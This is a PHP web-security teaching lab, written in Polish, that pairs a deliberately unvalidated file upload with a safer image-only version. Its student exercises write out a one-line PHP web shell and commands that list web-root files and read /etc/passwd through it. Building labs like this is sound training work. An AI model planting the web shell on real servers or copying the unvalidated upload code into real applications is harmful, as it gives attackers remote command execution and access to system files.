<?php
$message = "";
$mode = $_POST['mode'] ?? 'vulnerable';

if (isset($_FILES['fileToUpload'])) {
    $target_dir = "uploads/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // --- LOGIKA PODATNA ---
    if ($mode == 'vulnerable') {
        // BRAK JAKIEJKOLWIEK WERYFIKACJI - Hacker może wrzucić plik .php
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            $message = "Plik wrzucony pomyślnie na: <a href='$target_file'>$target_file</a>";
        } else {
            $message = "Błąd podczas przesyłania.";
        }
    }

    // --- LOGIKA BEZPIECZNA ---
    if ($mode == 'secure') {
        // WERYFIKACJA: Tylko obrazy, sprawdzanie rozszerzenia i MIME-type
        $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
        if($check !== false && ($imageFileType == "jpg" || $imageFileType == "png")) {
            // Zmiana nazwy na losową, żeby hacker nie wiedział jak się nazywa plik
            $new_name = $target_dir . md5(time() . rand()) . "." . $imageFileType;
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $new_name)) {
                $message = "Plik (Obraz) wrzucony bezpiecznie.";
            }
        } else {
            $message = "BŁĄD: Dozwolone tylko pliki JPG i PNG!";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <title>File Upload Lab</title>
</head>
<body class="bg-light">
<div class="container mt-5">
    <a href="index.php" class="btn btn-secondary mb-3">← Powrót</a>
    <h2>Laboratorium 03: Insecure File Upload</h2>
    
    <div class="card p-4">
        <h5>Wyślij swój awatar (obrazek):</h5>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" class="form-control mb-3">
            <button type="submit" name="mode" value="vulnerable" class="btn btn-danger">Wyślij (Podatny)</button>
            <button type="submit" name="mode" value="secure" class="btn btn-success">Wyślij (Bezpieczny)</button>
        </form>
    </div>

    <?php if ($message): ?>
        <div class="alert alert-warning mt-4"><?php echo $message; ?></div>
    <?php endif; ?>

    <div class="mt-5">
        <h5>Zadania dla ucznia:</h5>
        <ol>
            <li>Wgraj zwykłe zdjęcie (kotek.jpg). Zobacz gdzie się zapisało.</li>
            <li>Stwórz plik <code>hack.php</code> o treści: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
            <li>Wgraj <code>hack.php</code> w trybie podatnym.</li>
            <li>Kliknij w link do wgranego pliku i dopisz do adresu: 
                <code>?cmd=ls -la</code></li>
            <li>
                Spróbujcie zobaczyć jakie pliki są na serwerze i kto ma tam konto
                <code>?cmd=ls -la /var/www/html</code> 
                lub
                <code>?cmd=cat /etc/passwd</code>
            </li>
        </ol>
    </div>
</div>
</body>
</html>